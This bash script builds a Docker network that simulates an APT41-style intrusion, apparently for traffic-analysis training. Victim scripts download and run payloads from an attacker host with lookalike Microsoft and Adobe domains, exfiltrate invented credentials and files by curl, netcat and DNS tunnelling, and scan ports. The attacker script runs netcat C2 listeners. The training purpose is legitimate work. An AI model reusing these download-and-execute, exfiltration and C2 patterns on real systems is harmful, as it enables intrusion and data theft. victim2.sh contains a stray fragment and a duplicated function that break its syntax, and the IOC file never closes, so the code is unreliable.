#!/bin/bash

set -e

CHALLENGE_DIR="APT41"
BEACON_HASH="6e8f83c88a66116e1a7eb10549542890d1910aee0000e3e70f6307aae21f9090"
CRACKSHOT_HASH="04fb0ccf3ef309b1cd587f609ab0e81e"
CRACKSHOT2_HASH="fcfab508663d9ce519b51f767e902806"
GEARSHIFT_HASH="5b26f5c7c367d5e976aaba320965cc7f"

REAL_C2_DOMAINS=(
    "microsoft-update-service.net"
    "adobe-security-updates.org"
    "windows-defender-updates.com"
    "chrome-extension-update.net"
    "office365-security-patch.com"
    "vmware-tools-update.org"
)

LEGIT_TRAFFIC_SITES=(
    "github.com"
    "stackoverflow.com"
    "microsoft.com"
    "adobe.com"
    "google.com"
    "cloudflare.com"
    "aws.amazon.com"
)

cleanup() {
    echo "Cleaning up..."
    docker-compose -f $CHALLENGE_DIR/docker-compose.yml down --volumes --remove-orphans 2>/dev/null || true
    docker network rm apt_internal_net apt41_internal_net 2>/dev/null || true
    docker network prune -f 2>/dev/null || true
}

trap cleanup EXIT

echo "Checking for conflicting Docker networks..."
CONFLICTING_NETWORKS=$(docker network ls --filter name=apt --format "{{.Name}}" || true)
if [ ! -z "$CONFLICTING_NETWORKS" ]; then
    echo "Removing conflicting networks: $CONFLICTING_NETWORKS"
    docker network rm $CONFLICTING_NETWORKS 2>/dev/null || true
fi

SUBNET_CONFLICTS=$(docker network ls --format "table {{.Name}}" | xargs -I {} docker network inspect {} 2>/dev/null | grep -B5 -A5 "172.20.1.0/24" | grep "Name" | awk -F'"' '{print $4}' || true)
if [ ! -z "$SUBNET_CONFLICTS" ]; then
    echo "Found subnet conflicts in networks: $SUBNET_CONFLICTS"
    echo "Removing conflicting networks..."
    for network in $SUBNET_CONFLICTS; do
        docker network rm "$network" 2>/dev/null || true
    done
fi

echo "Creating Advanced APT Network Challenge..."
rm -rf $CHALLENGE_DIR
mkdir -p $CHALLENGE_DIR/{scripts,pcaps,intel,payloads,logs,nginx_build}

cat > $CHALLENGE_DIR/nginx_build/Dockerfile << 'EOF'
FROM nginx:alpine
COPY nginx.conf /etc/nginx/conf.d/default.conf
EOF

cat > $CHALLENGE_DIR/nginx_build/nginx.conf << 'EOF'
server {
    listen 80;
    server_name cdn.microsoft-updates.net update.microsoft-security.com qayssarayra.com;
    location / {
        return 200 "Qays Sarayra - Cybersecurity Expert\nSpecializing in: Network Security, Threat Hunting, Digital Forensics\nContact: info@qayssarayra.com\nServices: APT Investigation, Malware Analysis, Incident Response, DFIR Consulting";
        add_header Content-Type text/plain;
    }
}
EOF

cat > $CHALLENGE_DIR/docker-compose.yml << 'EOF'
version: '3.8'
services:
  victim_ws1:
    image: ubuntu:20.04
    hostname: HR-WORKSTATION-01
    networks:
      internal_net:
        ipv4_address: 172.25.1.100
    volumes:
      - ./scripts:/opt/scripts
      - ./pcaps:/opt/pcaps
      - ./payloads:/opt/payloads
    command: bash -c "apt-get update -qq && apt-get install -y tcpdump curl wget netcat-openbsd python3 python3-requests dnsutils nmap openssh-client openssl xxd -qq && /opt/scripts/victim1.sh"
    cap_add:
      - NET_ADMIN
    privileged: true

  victim_ws2:
    image: ubuntu:20.04  
    hostname: FINANCE-PC-02
    networks:
      internal_net:
        ipv4_address: 172.25.1.101
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl wget netcat-openbsd python3 python3-requests openssh-server openssl -qq && /opt/scripts/victim2.sh"

  victim_ws3:
    image: ubuntu:20.04
    hostname: DEV-MACHINE-03
    networks:
      internal_net:
        ipv4_address: 172.25.1.102
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y curl wget netcat-openbsd git nodejs npm -qq && /opt/scripts/victim3.sh"

  domain_controller:
    image: ubuntu:20.04
    hostname: CORP-DC-01
    networks:
      internal_net:
        ipv4_address: 172.25.1.10
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y bind9 openssh-server samba openssl curl -qq && /opt/scripts/dc.sh"

  file_server:
    image: ubuntu:20.04
    hostname: FILE-SRV-01
    networks:
      internal_net:
        ipv4_address: 172.25.1.11
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y samba openssh-server -qq && /opt/scripts/fileserver.sh"

  attacker_external:
    image: ubuntu:20.04
    hostname: external-vps
    networks:
      internal_net:
        ipv4_address: 172.25.1.200
    volumes:
      - ./scripts:/opt/scripts  
      - ./payloads:/opt/payloads
    command: bash -c "apt-get update -qq && apt-get install -y python3 python3-requests netcat-openbsd socat curl wget openssl dnsutils python3-cryptography -qq && /opt/scripts/attacker.sh"

  proxy_server:
    image: ubuntu:20.04
    hostname: proxy-internal
    networks:
      internal_net:
        ipv4_address: 172.25.1.5
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y squid apache2-utils -qq && /opt/scripts/proxy.sh"

  web_server:
    image: nginx:alpine
    hostname: legit-cdn
    networks:
      internal_net:
        ipv4_address: 172.25.1.3
    volumes:
      - ./nginx_build/nginx.conf:/etc/nginx/conf.d/default.conf:ro
    ports:
      - "80:80"

  smtp_server:
    image: ubuntu:20.04
    hostname: mail-internal
    networks:
      internal_net:
        ipv4_address: 172.25.1.4
    volumes:
      - ./scripts:/opt/scripts
    command: bash -c "apt-get update -qq && apt-get install -y postfix netcat-openbsd -qq && /opt/scripts/smtp.sh"
    environment:
      - DEBIAN_FRONTEND=noninteractive

networks:
  internal_net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.25.1.0/24
EOF

cat > $CHALLENGE_DIR/scripts/victim1.sh << 'EOF'
#!/bin/bash

echo "HR-WORKSTATION-01 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts
echo "172.25.1.200 adobe-security-updates.org" >> /etc/hosts
echo "172.25.1.200 windows-defender-updates.com" >> /etc/hosts
echo "172.25.1.200 chrome-extension-update.net" >> /etc/hosts
echo "172.25.1.3 qayssarayra.com" >> /etc/hosts

mkdir -p /opt/pcaps
tcpdump -i eth0 -w /opt/pcaps/network_capture.pcap -s 0 -B 4096 &
TCPDUMP_PID=$!
echo "Started comprehensive tcpdump with PID: $TCPDUMP_PID"

sleep 15

generate_normal_traffic() {
    SITES=("github.com" "stackoverflow.com" "microsoft.com" "adobe.com" "google.com" "cloudflare.com")
    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    )
    
    while true; do
        SITE=${SITES[$RANDOM % ${#SITES[@]}]}
        UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
        
        timeout 10 curl -s -A "$UA" \
             -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
             -H "Accept-Language: en-US,en;q=0.5" \
             -H "Accept-Encoding: gzip, deflate" \
             -H "Connection: keep-alive" \
             --connect-timeout 5 --max-time 10 \
             "http://$SITE" > /dev/null 2>&1 || true
        
        sleep $((RANDOM % 60 + 30))
    done
}

spear_phishing_simulation() {
    sleep 5
    echo "[$(date)] User received targeted spear phishing email..."
    
    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
         -H "Referer: https://outlook.office365.com" \
         "http://172.25.1.200:8080/campaign/invoice_Q4_2024.pdf.exe" \
         -o /tmp/invoice_Q4_2024.pdf.exe || true
    
    sleep 2
    
    chmod +x /tmp/invoice_Q4_2024.pdf.exe 2>/dev/null || true
    /tmp/invoice_Q4_2024.pdf.exe &
    
    echo "[$(date)] Initial payload executed"
}

establish_c2_channel() {
    sleep 10
    
    SESSION_ID=$(openssl rand -hex 16)
    
    for i in {1..5}; do
        JITTER=$((RANDOM % 10 + 5))
        
        BEACON_DATA=$(echo "hostname=HR-WORKSTATION-01&user=shosho.ahmed&domain=CORP&os=Windows10&build=19045" | base64 -w 0)
        
        curl -s -H "User-Agent: Microsoft BITS/7.8" \
             -H "X-Session-ID: $SESSION_ID" \
             -H "Content-Type: application/x-www-form-urlencoded" \
             -H "X-Request-ID: $(cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 32 | head -n 1)" \
             --data "data=$BEACON_DATA" \
             "http://microsoft-update-service.net:8081/api/v1/check" > /tmp/c2_response 2>/dev/null || true
        
        if [ -s /tmp/c2_response ]; then
            COMMAND=$(cat /tmp/c2_response | base64 -d 2>/dev/null | grep -o '"cmd":"[^"]*"' | cut -d'"' -f4 2>/dev/null || true)
            if [ ! -z "$COMMAND" ]; then
                execute_c2_command "$COMMAND"
            fi
        fi
        
        sleep $JITTER
    done
}

execute_c2_command() {
    local cmd="$1"
    case "$cmd" in
        "sysinfo")
            RESULT=$(uname -a | base64 -w 0)
            ;;
        "netinfo")
            RESULT=$(ip addr show | base64 -w 0)
            ;;
        "proclist")
            RESULT=$(ps aux | base64 -w 0)
            ;;
        "download")
            download_additional_payload
            RESULT=$(echo "payload_downloaded" | base64 -w 0)
            ;;
        *)
            RESULT=$(echo "unknown_command" | base64 -w 0)
            ;;
    esac
    
    curl -s -X POST -H "Content-Type: application/json" \
         -H "X-Session-ID: $SESSION_ID" \
         --data "{\"result\":\"$RESULT\",\"timestamp\":\"$(date -u +%Y%m%d%H%M%S)\"}" \
         "http://microsoft-update-service.net:8081/api/v1/result" > /dev/null 2>&1 || true
}

download_additional_payload() {
    sleep 10
    
    curl -s -H "User-Agent: Windows Update Agent" \
         "http://adobe-security-updates.org:8082/updates/KB5034441.msu" \
         -o /tmp/update.msu || true
    
    chmod +x /tmp/update.msu 2>/dev/null || true
    /tmp/update.msu &
}

credential_harvesting() {
    sleep 15
    
    curl -s -H "User-Agent: CredentialHarvester/2.1" \
         -H "X-Password-Key: qaysuruncle" \
         "http://172.25.1.200:8084/tools/vaultkey?key=qaysuruncle" > /dev/null 2>&1 || true
    
    sleep 2
    
    BROWSER_CREDS="{
        \"type\":\"chrome_passwords\",
        \"data\":[
            {\"url\":\"https://portal.corp.internal\",\"username\":\"shosho.ahmed\",\"password\":\"Summer2024!\",\"date_created\":\"2024-01-15\"},
            {\"url\":\"https://payroll.corp.internal\",\"username\":\"shosho.ahmed\",\"password\":\"HR_P@ss123\",\"date_created\":\"2024-02-20\"},
            {\"url\":\"https://banking.chase.com\",\"username\":\"s.ahmed.personal\",\"password\":\"MyPersonal\$2024\",\"date_created\":\"2024-03-10\"}
        ]
    }"
    
    ENCRYPTED_CREDS=$(echo "$BROWSER_CREDS" | openssl enc -aes-256-cbc -a -salt -pass pass:qaysuruncle 2>/dev/null || echo "$BROWSER_CREDS" | base64 -w 0)
    
    curl -s -X POST -H "Content-Type: application/octet-stream" \
         -H "X-Data-Type: credentials" \
         -H "X-Encryption: aes256" \
         --data "$ENCRYPTED_CREDS" \
         "http://windows-defender-updates.com:8082/api/upload" > /dev/null 2>&1 || true
}

dns_tunneling() {
    sleep 20
    
    COMMANDS=("whoami" "net_user" "ipconfig" "systeminfo" "tasklist" "net_group_domain_admins")
    
    for cmd in "${COMMANDS[@]}"; do
        ENCODED=$(echo -n "$cmd" | base64 | tr -d '=' | tr '/+' '_-')
        
        nslookup "${ENCODED}.update.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
        sleep 1
        
        nslookup -type=TXT "response.${ENCODED}.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
        sleep 1
    done
}

lateral_movement_recon() {
    sleep 25
    
    echo "Starting reconnaissance scan at $(date)"
    
    for target in "172.25.1.10" "172.25.1.11" "172.25.1.101" "172.25.1.102"; do
        for port in 22 135 139 445 3389 5985; do
            timeout 2 bash -c "echo '' > /dev/tcp/$target/$port" 2>/dev/null && echo "Port $port open on $target" || true
            sleep 0.2
        done
        sleep 0.5
    done
    
    for host in "172.25.1.10" "172.25.1.11" "172.25.1.101"; do
        echo "admin" | timeout 3 nc -w 3 $host 445 > /dev/null 2>&1 || true
        sleep 1
    done
    
    RECON_DATA="{\"type\":\"network_recon\",\"discovered_hosts\":[\"172.25.1.10\",\"172.25.1.11\",\"172.25.1.101\",\"172.25.1.102\"],\"services\":[\"smb\",\"rdp\",\"ssh\"]}"
    curl -s -X POST -H "Content-Type: application/json" \
         --data "$RECON_DATA" \
         "http://microsoft-update-service.net:8081/api/v1/recon" > /dev/null 2>&1 || true
}

data_staging() {
    sleep 30
    
    STAGED_FILES="{
        \"operation\":\"data_collection\",
        \"files\":[
            {\"path\":\"C:\\\\Users\\\\shosho\\\\Documents\\\\Employee_Database.xlsx\",\"size\":\"2.4MB\",\"hash\":\"d41d8cd98f00b204e9800998ecf8427e\"},
            {\"path\":\"C:\\\\Users\\\\ameed\\\\Desktop\\\\Salary_Report_2024.docx\",\"size\":\"856KB\",\"hash\":\"e99a18c428cb38d5f260853678922e03\"},
            {\"path\":\"C:\\\\Users\\\\Public\\\\Shared\\\\HR_Policies.pdf\",\"size\":\"1.2MB\",\"hash\":\"ab87d24bdc7452e55738deb5f868e1f7\"}
        ],
        \"total_size\":\"4.5MB\",
        \"staging_time\":\"$(date -u +%Y-%m-%d_%H:%M:%S)\"
    }"
    
    curl -s -X POST -H "Content-Type: application/json" \
         -H "X-Operation: data_staging" \
         --data "$STAGED_FILES" \
         "http://chrome-extension-update.net:8083/api/stage" > /dev/null 2>&1 || true
}

malware_deployment() {
    sleep 35
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data '{"hash":"04fb0ccf3ef309b1cd587f609ab0e81e","family":"CRACKSHOT","deployment":"lateral_spread"}' \
         "http://172.25.1.200:8081/malware_deploy" > /dev/null 2>&1 || true
}

data_exfiltration() {
    sleep 40
    
    for i in {1..3}; do
        EXFIL_DATA=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c $((1024 * $i)))
        CHUNK_HASH=$(echo -n "$EXFIL_DATA" | md5sum | cut -d' ' -f1)
        
        case $i in
            1)
                curl -s -X POST -H "Content-Type: application/octet-stream" \
                     -H "X-Chunk-ID: $i" \
                     -H "X-Chunk-Hash: $CHUNK_HASH" \
                     --data-binary "$EXFIL_DATA" \
                     "http://adobe-security-updates.org:8082/api/upload" > /dev/null 2>&1 || true
                ;;
            2)
                echo "$EXFIL_DATA" | nc -w 5 172.25.1.200 9001 > /dev/null 2>&1 || true
                ;;
            3)
                ENCODED_DATA=$(echo -n "$EXFIL_DATA" | head -c 100 | base64 | tr -d '=' | tr '/+' '_-')
                nslookup "data.${ENCODED_DATA}.microsoft-update-service.net" 172.25.1.200 > /dev/null 2>&1 || true
                ;;
        esac
        
        sleep 2
    done
}

golden_ticket_simulation() {
    sleep 50
    
    KRBTGT_HASH="502c2ba5c4e1234567890abcdef12345"
    DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data "{\"attack\":\"golden_ticket\",\"krbtgt_hash\":\"$KRBTGT_HASH\",\"domain\":\"CORP\",\"sid\":\"$DOMAIN_SID\",\"user\":\"Administrator\",\"timestamp\":\"$(date -u)\"}" \
         "http://172.25.1.200:8081/api/v1/persistence" > /dev/null 2>&1 || true
    
    echo "[$(date)] Logon with golden ticket - User: Administrator, Source: 172.25.1.100" >> /var/log/security.log
}

anti_forensics() {
    sleep 55
    
    > /tmp/clear_logs.sh
    echo "#!/bin/bash" > /tmp/clear_logs.sh
    chmod +x /tmp/clear_logs.sh
    /tmp/clear_logs.sh
    
    touch -t 202401150800 /tmp/invoice_Q4_2024.pdf.exe 2>/dev/null || true
    touch -t 202401150800 /tmp/update.msu 2>/dev/null || true
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data "{\"action\":\"cleanup\",\"status\":\"complete\",\"timestamp\":\"$(date -u)\"}" \
         "http://microsoft-update-service.net:8081/api/v1/cleanup" > /dev/null 2>&1 || true
}

contact_incident_response() {
    sleep 60
    
    for attempt in {1..3}; do
        curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
             -H "Host: qayssarayra.com" \
             -H "Referer: https://www.google.com/search?q=cybersecurity+incident+response+expert" \
             "http://172.25.1.3/" > /dev/null 2>&1 || true
        sleep 2
    done
    
    EMAIL_CONTENT="From: ameed.khaled@corp.internal
To: info@qayssarayra.com
Subject: CRITICAL - Advanced Persistent Threat Detected
Date: $(date -R)
Message-ID: <$(date +%s).security@corp.internal>

Dear Cybersecurity Expert,

We have detected sophisticated malicious activity on our corporate network:

- Multiple workstations compromised
- Unusual network traffic patterns
- Potential data exfiltration
- Advanced evasion techniques observed

Urgently need expert incident response assistance.
Please contact: ameed.khaled@corp.internal

Threat indicators:
- Suspicious domains: microsoft-update-service.net, adobe-security-updates.org  
- Malware hashes: 04fb0ccf3ef309b1cd587f609ab0e81e
- Compromised hosts: HR-WORKSTATION-01, FINANCE-PC-02

Time is critical.

Ameed Khaled
IT Security Manager
CORP Enterprise"
    
    EMAIL_B64=$(echo "$EMAIL_CONTENT" | base64 -w 76)
    
    {
        echo "HELO corp.internal"
        echo "MAIL FROM:<ameed.khaled@corp.internal>"  
        echo "RCPT TO:<info@qayssarayra.com>"
        echo "DATA"
        echo "$EMAIL_B64"
        echo "."
        echo "QUIT"
    } | nc -w 10 172.25.1.4 25 > /dev/null 2>&1 || true
}

generate_normal_traffic &
spear_phishing_simulation &
establish_c2_channel &
credential_harvesting &
lateral_movement_recon &
malware_deployment &
data_staging &
dns_tunneling &
data_exfiltration &
golden_ticket_simulation &
anti_forensics &
contact_incident_response &

sleep 180

kill $TCPDUMP_PID 2>/dev/null || true
echo "Advanced traffic capture complete"

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/victim2.sh << 'EOF'
#!/bin/bash

echo "FINANCE-PC-02 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts

sleep 60

service ssh start

lateral_infection() {
    sleep 30
    wget -q -O /tmp/lateral.exe "http://172.25.1.200:8080/stage2/lateral_payload.exe" || true
    chmod +x /tmp/lateral.exe
    /tmp/lateral.exe &
}

financial_data_access() {
    sleep 40
    FINANCIAL_QUERY="{\"query\":\"SELECT * FROM transactions WHERE amount > 10000\",\"database\":\"FinanceDB\",\"user\":\"osama.binladen\"}"
    curl -s -X POST -H "Content-Type: application/json" \
         -d "$FINANCIAL_QUERY" \
         "http://microsoft-update-service.net:8081/db_access" > /dev/null 2>&1 || true
}

privilege_escalation() {
    sleep 60
    curl -s -X POST -H "Content-Type: application/json" \
         -d "{\"method\":\"UAC_bypass\",\"target\":\"FINANCE-PC-02\",\"user\":\"osama.binladen\",\"elevated\":true}" \
         "http://microsoft-update-service.net:8081/escalate" > /dev/null 2>&1 || true
}access" > /dev/null 2>&1 || true
}

privilege_escalation() {
    sleep 300
    curl -s -X POST -H "Content-Type: application/json" \
         -d "{\"method\":\"UAC_bypass\",\"target\":\"FINANCE-PC-02\",\"user\":\"osama.binladen\",\"elevated\":true}" \
         "http://microsoft-update-service.net:8081/escalate" > /dev/null 2>&1 || true
}

lateral_infection &
financial_data_access &
privilege_escalation &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/victim3.sh << 'EOF'
#!/bin/bash

echo "DEV-MACHINE-03 initializing..."

echo "172.25.1.10 corp-dc-01.internal.corp" >> /etc/hosts
echo "172.25.1.200 microsoft-update-service.net" >> /etc/hosts

sleep 90

dev_activities() {
    while true; do
        git ls-remote https://github.com/microsoft/vscode > /dev/null 2>&1 || true
        sleep $((RANDOM % 300 + 120))
        
        curl -s https://registry.npmjs.org/lodash > /dev/null 2>&1 || true
        sleep $((RANDOM % 200 + 60))
    done
}

supply_chain_attack() {
    sleep 50
    
    curl -s "http://172.25.1.200:8080/npm/lodash-compromised.tgz" -o /tmp/lodash.tgz || true
    
    node -e "
    const https = require('https');
    const data = JSON.stringify({
        'hostname': 'DEV-MACHINE-03',
        'user': 'developer',
        'env': process.env,
        'cwd': process.cwd()
    });
    " > /tmp/supply_chain.js 2>/dev/null || true
    
    node /tmp/supply_chain.js 2>/dev/null || true
}

dev_activities &
supply_chain_attack &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/fileserver.sh << 'EOF'
#!/bin/bash

echo "FILE-SRV-01 initializing..."

service smbd start
service ssh start

sleep 120

file_access_simulation() {
    sleep 40
    
    FILES=("Confidential_Salaries_2024.xlsx" "Employee_SSN_Database.csv" "Executive_Compensation.pdf" "Merger_Documents_CLASSIFIED.docx")
    
    for file in "${FILES[@]}"; do
        echo "[$(date)] File accessed: \\\\FILE-SRV-01\\HR\\$file by user shosho.ahmed from 172.25.1.100" >> /var/log/file_access.log
        sleep 5
        
        curl -s -X POST -H "Content-Type: application/json" \
             --data "{\"file\":\"$file\",\"size\":\"$((RANDOM % 5000 + 1000))KB\",\"access_time\":\"$(date -u)\"}" \
             "http://172.25.1.200:8083/api/stage" > /dev/null 2>&1 || true
    done
}

file_access_simulation &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/dc.sh << 'EOF'
#!/bin/bash

echo "CORP-DC-01 initializing..."

service bind9 start
service ssh start
service smbd start

sleep 120

kerberoasting_simulation() {
    sleep 40
    
    SERVICE_ACCOUNTS=("MSSQL/db-server.corp.internal" "HTTP/sharepoint.corp.internal" "TERMSRV/terminal.corp.internal")
    
    for service in "${SERVICE_ACCOUNTS[@]}"; do
        echo "[$(date)] TGS-REQ for $service from 172.25.1.100 (shosho.ahmed)" >> /var/log/kerberos.log
        sleep 5
        
        curl -s -X POST -H "Content-Type: application/json" \
             --data "{\"attack\":\"kerberoast\",\"service\":\"$service\",\"hash\":\"$1$(openssl rand -hex 16)\",\"cracked\":\"Service123!\",\"timestamp\":\"$(date -u)\"}" \
             "http://172.25.1.200:8081/api/v1/kerberos" > /dev/null 2>&1 || true
        
        sleep 5
    done
}

golden_ticket_simulation() {
    sleep 80
    
    KRBTGT_HASH="502c2ba5c4e1234567890abcdef12345"
    DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
    
    curl -s -X POST -H "Content-Type: application/json" \
         --data "{\"attack\":\"golden_ticket\",\"krbtgt_hash\":\"$KRBTGT_HASH\",\"domain\":\"CORP\",\"sid\":\"$DOMAIN_SID\",\"user\":\"Administrator\",\"timestamp\":\"$(date -u)\"}" \
         "http://172.25.1.200:8081/api/v1/persistence" > /dev/null 2>&1 || true
    
    echo "[$(date)] Logon with golden ticket - User: Administrator, Source: 172.25.1.100" >> /var/log/security.log
}

kerberoasting_simulation &
golden_ticket_simulation &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/proxy.sh << 'EOF'
#!/bin/bash

echo "Internal proxy server starting..."

cat > /etc/squid/squid.conf << 'SQUID_EOF'
http_port 3128
access_log /var/log/squid/access.log
cache_log /var/log/squid/cache.log

acl internal_net src 172.25.1.0/24
http_access allow internal_net
http_access deny all

cache_dir ufs /var/spool/squid 100 16 256
SQUID_EOF

service squid start

tail -f /var/log/squid/access.log &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/smtp.sh << 'EOF'
#!/bin/bash

echo "Mail server initializing..."

echo "myhostname = mail-internal.corp.local" >> /etc/postfix/main.cf
echo "mydomain = corp.local" >> /etc/postfix/main.cf

service postfix start

email_exfil_listener() {
    while true; do
        {
            read line
            if [[ "$line" == *"MAIL FROM"* ]]; then
                echo "250 OK"
            elif [[ "$line" == *"RCPT TO"* ]]; then
                echo "250 OK"
            elif [[ "$line" == "DATA" ]]; then
                echo "354 Start mail input"
                while read email_line; do
                    if [[ "$email_line" == "." ]]; then
                        break
                    fi
                    echo "[$(date)] EMAIL: $email_line" >> /var/log/mail_intercept.log
                done
                echo "250 OK"
            elif [[ "$line" == "QUIT" ]]; then
                echo "221 Bye"
                break
            else
                echo "250 OK"
            fi
        } | nc -l -p 25 || true
        sleep 1
    done
}

email_exfil_listener &

tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/scripts/attacker.sh << 'EOF'
#!/bin/bash

echo "Advanced C2 server infrastructure starting..."

generate_ssl_certs() {
    mkdir -p /tmp/ssl
    openssl req -x509 -newkey rsa:2048 -keyout /tmp/ssl/key.pem -out /tmp/ssl/cert.pem -days 365 -nodes \
        -subj "/C=US/ST=CA/L=SF/O=Microsoft Corporation/CN=microsoft-update-service.net" 2>/dev/null || true
}

start_main_c2() {
    while true; do
        {
            read -r request_line
            read -r host_header
            
            method=$(echo "$request_line" | cut -d' ' -f1)
            path=$(echo "$request_line" | cut -d' ' -f2)
            
            if [[ "$path" == *"/api/v1/check"* ]]; then
                COMMANDS=('{"cmd":"sysinfo"}' '{"cmd":"netinfo"}' '{"cmd":"proclist"}' '{"cmd":"download"}' '{"cmd":"sleep"}')
                CMD=${COMMANDS[$RANDOM % ${#COMMANDS[@]}]}
                CMD_B64=$(echo -n "$CMD" | base64 -w 0)
                
                response="HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: ${#CMD_B64}\r\nServer: Microsoft-IIS/10.0\r\n\r\n$CMD_B64"
                echo -e "$response"
                
            elif [[ "$path" == *"/api/v1/result"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 2\r\n\r\nOK"
                
            elif [[ "$path" == *"/api/v1/persistence"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 21\r\n\r\n{\"status\":\"persisted\"}"
                
            elif [[ "$path" == *"/malware_deploy"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 19\r\n\r\n{\"status\":\"deployed\"}"
                
            elif [[ "$path" == *"/campaign/"* ]]; then
                payload="MZ\x90\x00\x03\x00\x00\x00FAKE_PAYLOAD_DATA_HERE"
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: ${#payload}\r\n\r\n$payload"
                
            else
                echo -e "HTTP/1.1 404 Not Found\r\nContent-Length: 9\r\n\r\nNot Found"
            fi
        } | nc -l -p 8081 || true
        sleep 0.1
    done
}

start_secondary_c2() {
    while true; do
        {
            read request
            if [[ "$request" == *"/updates/"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 1024\r\n\r\n$(head -c 1024 /dev/urandom)"
            elif [[ "$request" == *"/api/upload"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Length: 8\r\n\r\nRECEIVED"
            else
                echo -e "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
            fi
        } | nc -l -p 8082 || true
        sleep 0.1
    done
}

start_key_server() {
    while true; do
        {
            read request
            if [[ "$request" == *"/tools/vaultkey"* ]]; then
                echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 26\r\n\r\nDecryption key: qaysuruncle"
            else
                echo -e "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK"
            fi
        } | nc -l -p 8084 || true
        sleep 0.5
    done
}

start_staging_server() {
    while true; do
        echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 17\r\n\r\n{\"status\":\"staged\"}" | nc -l -p 8083 || true
        sleep 0.5
    done
}

start_raw_exfil() {
    while true; do
        nc -l -p 9001 > /tmp/exfil_$(date +%s).data || true
        sleep 1
    done
}

start_dns_server() {
    while true; do
        echo "Received DNS query: $(date)" | nc -l -u -p 53 || true
        sleep 0.1
    done
}

start_payload_server() {
    while true; do
        echo -e "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 7\r\n\r\nPAYLOAD" | nc -l -p 8080 || true
        sleep 1
    done
}

generate_ssl_certs

start_payload_server &
start_main_c2 &
start_secondary_c2 &
start_key_server &
start_staging_server &
start_raw_exfil &
start_dns_server &

echo "Multi-protocol C2 infrastructure running"
tail -f /dev/null
EOF

cat > $CHALLENGE_DIR/intel/comprehensive_iocs.txt << 'EOF'
microsoft-update-service.net
adobe-security-updates.org  
windows-defender-updates.com
chrome-extension-update.net
office365-security-patch.com
vmware-tools-update.org
qayssarayra.com
172.25.1.200
6e8f83c88a66116e1a7eb10549542890d1910aee0000e3e70f6307aae21f9090
04fb0ccf3ef309b1cd587f609ab0e81e
fcfab508663d9ce519b51f767e902806
5b26f5c7c367d5e976aaba320965cc7f
0b2e07205245697a749e422238f9f785
272537bbd2a8e2a2c3938dc31f0d2461
dd792f9185860e1464b4346254b2101b
e99a18c428cb38d5f260853678922e03
ab87d24bdc7452e55738deb5f868e1f7
d41d8cd98f00b204e9800998ecf8427e
502c2ba5c4e1234567890abcdef12345
S-1-5-21-1234567890-1234567890-1234567890
invoice_Q4_2024.pdf.exe
update.msu  
KB5034441.msu
lateral_payload.exe
crackshot.dll
beacon.dll
gearshift.exe
dusttrap.exe
pinegrove.exe
taskhost.exe
sbiedll.dll
lodash-compromised.tgz
ameed.khaled@corp.internal
info@qayssarayra.com
shosho.ahmed
Summer2024!
HR_P@ss123
MyPersonal$2024
osama.binladen
administrator
Service123!
crackshot2024
MSSQL/db-server.corp.internal
HTTP/sharepoint.corp.internal
TERMSRV/terminal.corp.internal
Employee_Database.xlsx
Salary_Report_2024.docx
HR_Policies.pdf
Confidential_Salaries_2024.xlsx
Employee_SSN_Database.csv
Executive_Compensation.pdf
Merger_Documents_CLASSIFIED.docx
